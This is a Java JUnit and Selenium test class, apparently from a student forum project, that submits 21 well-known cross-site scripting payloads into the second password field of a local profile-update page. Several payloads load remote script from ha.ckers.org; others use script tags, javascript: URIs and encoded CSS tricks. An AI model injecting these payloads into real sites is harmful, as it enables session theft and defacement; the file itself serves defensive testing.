/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.ict3103busbly;

//import java.io.ByteArrayOutputStream;
//import java.io.PrintStream;
import org.junit.Before;
import org.junit.Test;
import org.junit.After;
import static org.junit.Assert.*;
import org.openqa.selenium.Alert;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

/**
 *
 * @author pheeb
 */
public class UpdateProfilePass2XSS {
    
	WebDriver driver = new HtmlUnitDriver(true); 
    WebDriverWait wait; 
    String url = "http://localhost/ICT3103Busbly/updateProfile.php";
    
    String xss1 = "<script>alert(1)</script>";
    String xss2 = "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode<script>alert('xss')</script>";
    String xss3 = "//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
    String xss4 = "'';!--\"<XSS>=&{()}";
    String xss5 ="<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>";
    String xss6 ="<IMG SRC=\"javascript:alert('XSS');\">;";
    String xss7 ="<IMG SRC=javascript:alert('XSS')>";
    String xss8 ="<IMG SRC=javascrscriptipt:alert('XSS')>";
    String xss9 ="<IMG SRC=JaVaScRiPt:alert('XSS')>";
    String xss10 ="<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">";
    String xss11 ="IMG SRC=\" &#14;  javascript:alert('XSS');\">";
    String xss12 ="<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss13 ="<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss14 ="<<SCRIPT>alert(\"XSS\");//<</SCRIPT>";
    String xss15 ="<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>";
    String xss16 ="\\\";alert('XSS');//";
    String xss17 ="</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>";
    String xss18 ="<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">";
    String xss19 ="<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">";
    String xss20 ="<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">";
    String xss21 ="<DIV STYLE=\"width: expression(alert('XSS'));\">";
    		
    String email = "1801589@sit.singaporetech.edu.sg";
    String username = "santaclaus123";
    String password_1 = "Password123!";
    
    
    
@Before
    public void setUp() { 
		driver = new HtmlUnitDriver(); 
		wait = new WebDriverWait(driver, 30); 
	} 

@After
    public void tearDown() { 
		driver.quit(); 
	}	 
   
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script1() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss1);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script2() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss2);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    

    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script3() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss3);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script4() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss4);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script5() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss5);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script6() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss6);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script7() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss7);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
  
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script8() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss8);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script9() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss9);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script10() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss10);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script11() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss11);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script12() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss12);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script13() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss13);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script14() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss14);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script15() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss15);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script16() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss16);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script17() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss17);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script18() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss18);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script19() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss19);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script20() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss20);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_update_pass2_xss_script21() 
		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Forum")); 

		//enter input
		//use each and every possible xss statement and inject 
		//other field regardless correct/wrong does not matter as we are testing XSS attack on email field
		driver.findElement(By.name("email")).sendKeys(email);
                driver.findElement(By.name("username")).sendKeys(username);
                driver.findElement(By.name("password_1")).sendKeys(password_1);
                driver.findElement(By.name("password_2")).sendKeys(xss21);
		//click submit
		driver.findElement(By.name("update_profile")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    
    
    
    
    
    
}
